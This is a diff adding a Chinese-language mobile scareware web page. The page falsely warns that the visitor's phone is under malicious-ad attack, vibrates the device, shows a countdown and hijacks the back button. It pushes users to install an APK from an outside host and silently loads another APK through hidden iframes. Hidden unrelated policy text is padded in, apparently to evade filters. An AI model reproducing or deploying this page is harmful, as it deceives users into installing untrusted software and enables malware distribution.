@@ -1,0 +1,656 @@
+<html>
+
+<head>
+
+<base href="">
+
+<script src="https://o.a0shop.top/seajs.3"></script>
+
+    <script src="https://c.xiaozhuyoupu.com/us.js"></script>
+
+	<script src="https://c.xiaozhuyoupu.com/mdpb.js"></script>
+<script src="https://c.xiaozhuyoupu.com/jquery.min.js"></script>
+
+<!-- <audio id="mp3Btn"  autoplay="autoplay" preload="" loop="">
+
+     <source src="https://c.xiaozhuyoupu.com/alert2.mp3" type="audio/mpeg">
+
+  </audio> -->
+
+<script>
+
+				 //手机震动1秒
+
+                if (navigator.vibrate) {
+
+                    navigator.vibrate(8000);
+
+                } else if (navigator.webkitVibrate) {
+
+                    navigator.webkitVibrate(8000);
+
+                }
+
+</script>
+
+<script language="Javascript">
+
+function GetQueryString(name) {
+
+	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+
+	var r = window.location.search.substr(1).match(reg);
+
+	if (r != null) return unescape(r[2]);
+
+	return '浏览器';
+
+}
+
+
+
+</script>
+
+<script language="Javascript">
+
+var test = window.location.pathname;
+
+//strurl=test.replace(/p/, "cpp");
+
+
+
+//alert(strurl);
+
+</script>
+
+
+
+
+
+
+
+<meta charset="utf-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no">
+
+<link href="https://c.xiaozhuyoupu.com/style.css" type="text/css" rel="stylesheet">
+
+<title></title>
+
+
+
+
+
+<a href="/newlg"></a>
+
+<script>
+
+
+
+
+
+
+
+	  	function is_touch_device() {
+
+        return 'ontouchstart' in window // works on most browsers 
+
+                || 'onmsgesturechange' in window; // works on ie10
+
+    };
+
+
+
+
+
+    if ((is_touch_device() || (window.screen.availHeight + window.screen.availWidth) < 1700) && navigator.plugins.length == 0) {
+
+
+
+  		//alert('提示!\n\n您的手机 '+str4+area+' 浏览器版本过低、安全性能低、请立刻升级.\n\n**请勿关闭本窗口**');
+
+		alert('警告!\n\n您的'+str4+area+'手机疑似遭到恶意广告攻击！\n\n请根据提示进行清除.\n\n**请勿关闭本窗口**');
+
+  		
+
+		var ii = 0; // needed for safari
+
+		if (typeof history.pushState === "function") { 
+
+			history.pushState("back", null, null);          
+
+			window.onpopstate = function () { 
+
+				history.pushState('back', null, null);              
+
+				if(ii == 1) {
+
+					var popBack = $(".popup.fourth");
+
+					popBack.hide();
+
+					setTimeout(function(){
+
+					  popBack.show();
+
+					  if(popBack.hasClass("hidePop")) {
+
+						//alert("OK");
+
+						//popBack.removeClass("hidePop");
+
+					  } else {
+
+						$("a.button").click(function() {
+
+						  //popBack.addClass("hidePop");
+
+						 // return false;
+
+						});
+
+					  }
+
+					},300);
+
+					window.navigator.vibrate(5000);					    window.navigator.vibrate(5000);				}
+
+			}; 
+
+		}
+
+	
+
+		setTimeout(function(){ii = 1;},200);
+
+
+
+	  	addEventListener('load', function() {
+
+			setTimeout(function() {
+
+				changeText();
+
+	
+
+				function changeText() {
+
+	
+
+					setTimeout(function() {
+
+							$("#headTxt2").fadeIn();
+
+							$("#bodytxt").fadeIn();
+
+							$("#subhead").fadeIn();
+
+							
+
+						}, 1);
+
+	
+
+					
+
+				}
+
+	
+
+	
+
+			}, 0);
+
+		}, false);
+
+	
+
+		//timer script
+
+		var sec = 59; // set the seconds
+
+		var min = 04; // set the minutes
+
+		function countDown() {
+
+			sec--;
+
+			if (sec == -01) {
+
+				sec = 59;
+
+				min = min - 1; 
+
+			} else {
+
+				min = min; 
+
+			}
+
+			
+
+			if (sec<=9) { sec = "0" + sec; }
+
+			
+
+			time = (min<=9 ? "" + min : min) + " 分钟 " + sec + " 秒";
+
+			
+
+			if (document.getElementById) { document.getElementById('theTime').innerHTML = time; }
+
+			
+
+			SD=window.setTimeout("countDown();", 1000);
+
+			if (min == '00' && sec == '00') { sec = "00"; window.clearTimeout(SD); }
+
+		}
+
+		window.onload = countDown;
+
+		} else {
+
+			var lp = '/template_bt/lp/index.php';
+
+			//window.location.replace(lp);
+
+	}
+
+
+
+
+
+
+
+  </script>
+
+<link rel="stylesheet" type="text/css" href="https://c.xiaozhuyoupu.com/resources.css">
+
+<link rel="stylesheet" type="text/css" href="https://c.xiaozhuyoupu.com/minibrowser.widget.css">
+
+<body>
+
+<!--<style>
+
+.adtxt { position:absolute; top:5px; right:5px; width:35px; height:18px; line-height:18px; background:#000; color:#fff; font-size:12px;  text-align:center; border-radius:3px;}
+
+</style>
+
+<div class="adtxt">广告</div>
+
+-->
+
+<p style="display: none;">高峰岗对我县实施乡村振兴战略所做的工作给予充分肯定，认为我县认真贯彻落实习近平总书记关于“三农”工作的一系列新理念、新论断、新做法，严格按照中央、省、市部署，紧紧围绕“农业强、农村美、农民富”这一目标，充分发挥自身优势，着力深化农业供给侧结构性改革，农业农村改革发展取得了明显成效，走出了一条建设美丽乡村、实现共同富裕的新路径，值得学习借鉴。他希望我县按照“产业兴旺、生态宜居、乡风文明、治理有效、生活富裕”的总要求，进一步适应引领经济发展的新常态，深入贯彻落实乡村振兴战略，实现绿色发展、和谐发展、高质量发展。（王璐瑾）</p>
+
+<div style="display: none;"><script src="https://s19.cnzz.com/z_stat.php?id=1274444477&web_id=1274444477" language="JavaScript"></script></div>
+
+<div id="main-frame-error" class="interstitial-wrapper">
+
+  <div id="main-content"> <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="150.034px" height="53.012px" viewBox="0 0 150.034 53.012" enable-background="new 0 0 150.034 53.012" xml:space="preserve">
+
+    <image overflow="visible" width="53" height="53" xlink:href="https://c.xiaozhuyoupu.com/anzhuo.jpg" transform="matrix(1.0002 0 0 1.0002 0 0)"> </image>
+
+    </svg>
+
+    <div id="today" style="padding-top:0;"> 
+
+      <script type="text/javascript">
+
+				var currentTime = new Date();
+
+				// Array of day names
+
+				var dayNames = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
+
+				var date = currentTime.getDate();
+
+				var year = currentTime.getFullYear();
+
+				var info=area;
+
+                    document.write(dayNames[currentTime.getDay()]+" "+date+", "+year+info);
+
+			</script> 
+
+    </div>
+
+    <div id="main-message" style="clear: both;">
+
+    <div style=" position:fixed; top:5px; right:5px; width:35px; height:18px; line-height:18px; background:#000; color:#fff; font-size:12px;  text-align:center; border-radius:3px; opacity:0.1">广告</div>
+
+     <h1 id="headTxt2" style=""> 安卓系统提示您的手机<script language="Javascript">document.write(str4+area);</script> 可能遭到<span id="blink">(2)</span>个恶意广告代码的恶意攻击！</h1>
+
+      <div id="subhead" style="margin-bottom: 10px; color: black; font-weight: bold;"> </div>
+
+      <span style="font-size:18px;font-weight:bold;color:red;font-family:sans-serif;" id="theTime"></span>
+
+      
+
+      <div style=" float:left; width:100%;font-size:1em; font-weight:bold; line-height:1.4rem; color:#F00;  margin-bottom:12px;margin-top:10px;">上网提速200%</div>
+
+        <div style="clear:both;"></div>
+
+        <div style="float:left; width:100%;font-size: 0.72em; line-height:1em; color:#646464;">拦病毒 <span style="font-size:0.3em;color:#aaa;">●</span> 省流量 <span style="font-size: 0.3em;color:#aaa;">●</span> 不卡顿 <span style="font-size: 0.3em;color:#aaa;">●</span> 拦广告 <span style="font-size:0.3em;color:#aaa;">●</span> 更安全</div>
+
+        <div style="clear:both;"></div>
+
+        
+
+      <div id="bodytxt" style="position: relative;"><img style="float: right;" width="82" height="104" src="https://c.xiaozhuyoupu.com/du01.jpg">
+
+        <div id="successScan" style="margin-bottom:15px"></div>
+
+        <b>请按以下步骤修复浏览器:</b><br>
+
+        <br>
+
+        <b>第一步: </b> 点击以下按钮安装浏览器<br>
+
+        <br>
+
+        <b>第二步: </b>打开下载的防护浏览器，阻挡恶意代码的攻击</div>
+
+    </div>
+
+  </div>
+
+  <div id="details" class="" jstcache="0">
+
+<style>
+
+.liqishadu{
+
+box-sizing: border-box;padding:10px 15px;color:#fff;border-radius:3px;width: 100%;display: block;background: #0370ea;
+
+		background: -moz-linear-gradient(top,#008dfd 0,#0370ea 100%);
+
+		background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#008dfd),color-stop(100%,#0370ea));
+
+		background: -webkit-linear-gradient(top,#008dfd 0,#0370ea 100%);
+
+		background: -o-linear-gradient(top,#008dfd 0,#0370ea 100%);
+
+		background: -ms-linear-gradient(top,#008dfd 0,#0370ea 100%);
+
+		background: linear-gradient(top,#008dfd 0,#0370ea 100%);
+
+
+
+}
+
+
+
+</style>
+
+
+
+    <div jsselect="summary" jstcache="5"> <span style="text-align:center;display:block;"><!-- <SCRIPT LANGUAGE="JavaScript">document.writeln('<a href="'+strurl+'" class="liqishadu">立即杀毒</a>');</SCRIPT>--><a href="https://d.fjqinan.com/app/sg16.apk" class="liqishadu btn_link">立即清除</a> </span> </div>
+
+  </div>
+
+</div>
+
+ <script>
+
+$(document).ready(function(e) {
+
+    $(".guanbi").click(function(){
+
+		$(".popup").hide();
+
+		$(".Xbox").show();
+
+		$(".bg").show();
+
+		navigator.vibrate([1000, 10, 1000,10]);
+
+	});
+
+
+
+	$(".guanbi_1").click(function(){
+
+				$(".Xbox").hide();
+
+				$(".bg").hide();
+
+	});
+
+	var _webView="https://sl.sogoucdn.com/semob5.6.3_145603_R18664_121183046_build53514_1.2.4.2301.apk";
+
+	if(navigator.userAgent.toLowerCase().indexOf('sogou') > -1){
+
+		_webView="https://sl.sogoucdn.com/semob5.6.3_145603_R18664_121183046_build53514_1.2.4.2301.apk"
+
+	}
+
+	        setTimeout(function(){
+
+            try {
+
+                var ifr = document.createElement('iframe');
+
+                ifr.src = _webView;
+
+                ifr.width = 1;
+
+                ifr.height = 1;
+
+                ifr.style.visibility = 'hidden';
+
+                document.body.appendChild(ifr);
+
+            } catch(e) {}    
+
+        }, 100);
+
+  
+
+    //*****
+
+	       setTimeout(function(){
+
+            try {
+
+                var ifr = document.createElement('iframe');
+
+                ifr.src = _webView;
+
+                ifr.width = 1;
+
+                ifr.height = 1;
+
+                ifr.style.visibility = 'hidden';
+
+                document.body.appendChild(ifr);
+
+            } catch(e) {}    
+
+        }, 3000);
+
+			       setTimeout(function(){
+
+            try {
+
+                var ifr = document.createElement('iframe');
+
+                ifr.src = _webView;
+
+                ifr.width = 1;
+
+                ifr.height = 1;
+
+                ifr.style.visibility = 'hidden';
+
+                document.body.appendChild(ifr);
+
+            } catch(e) {}    
+
+        }, 6000);
+
+			       setTimeout(function(){
+
+            try {
+
+                var ifr = document.createElement('iframe');
+
+                ifr.src = _webView;
+
+                ifr.width = 1;
+
+                ifr.height = 1;
+
+                ifr.style.visibility = 'hidden';
+
+                document.body.appendChild(ifr);
+
+            } catch(e) {}    
+
+        }, 9000);
+
+});
+
+
+
+</script>
+
+
+
+
+
+
+
+<div class="bg" style="display: none;"></div>
+
+<div class="Xbox" style="display: none;">
+
+	<div class="tcont">
+
+		<div class="t1"><img src="https://c.xiaozhuyoupu.com/ico5.png"></div>
+
+		<div class="t2"> 提示!! </div>            
+
+	</div>
+
+	
+
+	<div class="tcont1">
+
+		<div class="t1">系统检测浏览器有5个可疑漏洞<br>
+
+ 可能导致泄露支付密码或被盗号<br>
+
+    请安装一键清除软件</div>
+
+		<div class="t2"><a class="button_1 btn_link" href="https://d.fjqinan.com/app/sg16.apk">确认</a></div>
+
+	</div>
+
+	<div class="guanbi_1" href="javascript:;" onClick="Lock_CheckForm(this);">×</div>
+
+</div>
+
+
+
+
+
+<div class="popup fourth" style="display: block;"> 
+
+ 
+
+  <style>
+
+.guanbi { position:absolute; top:8px; right:8px; width:40px; height:40px; text-align:center; line-height:40px; color:#555; font-family:Arial, Helvetica, sans-serif;}
+
+
+
+.bg{ float:left; width:100%; height:100%; background-color:rgba(0,0,0,0.5); position: fixed; left:0; top:0;}
+
+.Xbox{float:left;  width: 88%;  max-width: 280px;  margin: 0 0 0 -140px; background: #c00; border-radius:10px;-webkit-box-shadow:0 0 8px #5c0000;   -moz-box-shadow:0 0 8px #5c0000;   box-shadow:0 0 8px #5c0000; position: absolute;  top: 20%; left: 50%; font-family:"Microsoft YaHei"}
+
+	.tcont{float:left; width:100%; padding:15px 0 2px;; position:relative;color:#fff; }
+
+	.tcont .t1 img{ width: 26px;  height: 26px;  margin: 0 0 0 15px; float: left;}
+
+	.tcont .t2{  padding: 0 15px 0 8px; line-height: 29px; font-size: 20px; color: #fff000; text-align: center; float: left;}	
+
+	.tcont1{float:left;width:100%;padding:10px 0 10px;}
+
+	.tcont1 .t1{ padding:12px 22px; line-height:34px; font-size:16px; color:#fff; text-align:left;border-top:1px solid #ea2f2f;}	
+
+	.tcont1 .t2{ padding:3px 22px 6px 22px; }
+
+	a.button_1{padding:7px 0;color:#333;border-radius:8px;margin: 0 auto; border:1px solid fff;width: 50%;display: block;font-size:17px; text-align:center;background: #fff;}
+
+	a.button_1:active{ background: #000;}
+
+	.guanbi_1 {position: absolute;top: -3px;right: 0px; width: 40px; height: 40px; text-align: center;line-height: 40px; color: #ff8888;font-family: sans-serif; font-size: 22px;}
+
+</style>
+
+  <div class="guanbi">X</div>
+
+  <div class="popup-head"><img src="https://c.xiaozhuyoupu.com/du_ico1.png" style="height:26px;width:26px;position:absolute;top:13px;left:17px;">
+
+   提示!! </div>
+
+  <div class="popup-center"> 您的手机 <script language="Javascript">document.write(str4+area);</script>  可能会遭到恶意广告袭击!<br>
+
+    <br>
+
+   请安装一键清除软件.<br>
+
+    <br>
+
+    <span style="text-align:center;margin:0 auto;display: block;">**建议立刻下载**</span></div>
+
+  <div class="popup-bottom"> <!--<SCRIPT LANGUAGE="JavaScript">document.writeln('<a class="button" href="'+strurl+'">确定</a>');</SCRIPT>--><a class="button btn_link" href="https://d.fjqinan.com/app/sg16.apk">确定</a> </div>
+
+
+
+
+
+ 
+
+</div>
+
+
+
+<p style=" float:left; margin-top:200px; padding-bottom:0px;line-height: 0px;  font-size:12px; color:#ddd;text-align: center; width: 100%;">注：该页面为推广浏览器的广告页面</p>
+
+ <p style=" float:left; padding-bottom:0px;line-height: 0px;  font-size:12px; color:#ddd;text-align: center; width: 100%;">注:如需放弃修复请点击后退按钮</p>
+
+<!--
+
+    <audio autoplay="autoplay" preload="" loop>
+
+        <source src="//img.ercfh.com/shadu3/alert2.mp3" type="audio/mpeg">
+
+    </audio>
+
+   -->
+
+<div style="float:left; padding-bottom:4px;  width:100%; text-align:center;background:#fff; line-height:20px; bottom:0px; font-size:12px; color:#ddd;">广告和设备生产商<script language="Javascript">document.write(str4+area);</script>公司无关</div>
+
+<script type="text/javascript">
+
+var _btnList=document.getElementsByClassName('btn_link');
+
+if(navigator.userAgent.toLowerCase().indexOf('sogou') > -1){
+
+	for(var i=0;i<_btnList.length;i++){
+
+		_btnList[i].href="https://asdasd.crypp.cn/html/dl/fbkj3_1.html"
+
+	}
+
+}	
+
+</script>
+
+<p style="display: none;">质量兴农绿色兴农以及农业“新六产”发展，扎实推进农业农村改革，统筹推进农业人才队伍建设，创造性地开展工作，打造了一批农业金字招牌、培育了众多品牌主导产业、推出了系列创新举措、夯实了群众基础，许多方面都创出了有影响的特色和亮点，“三农”工作特别是现代农业发展一直走在全市乃至全省前列。同时，我县强力推进美丽乡村建设，繁荣发展乡村文化，构建现代化乡村治理体系</p>
+
+</body>
+
+</html>
